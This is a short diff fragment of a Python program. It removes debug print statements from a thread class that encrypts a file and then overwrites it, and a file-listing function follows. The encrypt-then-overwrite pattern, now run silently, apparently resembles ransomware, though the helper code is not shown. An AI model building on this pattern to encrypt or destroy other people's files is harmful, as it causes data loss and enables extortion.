@@ -23,12 +23,9 @@ class generate_thread(threading.Thread):
         This function is called when we want to create a new thread
         -> Start() function of the mother class "Thread"
         """
-        # Show you the thread ID (Debugging)
-        print("Starting " + str(self.thread_id))
         # Functions call
         encryption_function(self.key, self.file)
         overwrite_file(self.file)
-        print("Exiting " + str(self.thread_id))
 
 
 def list_files(path):
